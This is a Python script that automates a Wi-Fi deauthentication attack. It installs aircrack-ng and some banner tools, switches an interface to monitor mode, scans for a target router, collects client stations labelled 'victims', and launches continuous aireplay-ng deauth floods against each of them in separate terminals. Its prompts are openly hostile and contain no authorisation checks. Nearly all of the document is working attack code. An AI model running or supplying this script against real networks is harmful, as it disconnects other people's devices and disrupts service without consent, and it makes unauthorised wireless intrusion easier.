# deauth_script

import os
import time

os.system("clear")

os.system("git clone https://github.com/busyloop/lolcat")
os.system("cd lolcat/bin && gem install lolcat")
os.system("cd /usr/share")
os.system("git clone https://github.com/xero/figlet-fonts")
os.system("cd")
os.system("sudo apt install aircrack-ng")
os.system("clear")
os.system("figlet -f Poison Be Humble | lolcat ")

time.sleep(1)

os.system("airmon-ng")
interface = input(" \033[31;3m select the interface you want to set as monitor mode: \033[0m ")
os.system("airmon-ng start {}" .format(interface))
mon = 'mon'
monitor = interface + mon
print(" \033[33;3m using",monitor,"... \033[0m ")
time.sleep(2)
os.system("clear")
os.system("airodump-ng {}" .format(monitor))

router_bssid = input(" \033[31;3m Enter the BSSID of the router you want to fuck up: \033[0m ")
router_channel = int(input(" \033[31;3m Enter the Channel of the router you want to fuck up: \033[0m "))

os.system("airodump-ng {} --bssid {} --channel {}" .format(monitor,router_bssid,router_channel))

victims = int(input(" \033[31;3m Select the number of victims: \033[0m "))
station_list = []
control = 0
while control != victims:
    control += 1
    station = input(" \033[31;3m STATION: \033[0m ")
    station_list.append(station)
    print(station_list)
q = 'y'
while q == 'y':
    print(" \033[33;3m Wait a sec there champ!...")
    time.sleep(2)
    print("final check... | lolcat")
    time.sleep(1)
    print("interface.. \033[0m ",monitor)
    time.sleep(1)
    for i in range(0,len(station_list)):
        os.system("gnome-terminal -e 'aireplay-ng --deauth 0 -c {} -a {} {}'" .format(station_list[i],router_bssid,monitor))
    q = input("\033[34;3m You wanna Re-Fuck it (y/n) ? \033[0m ")
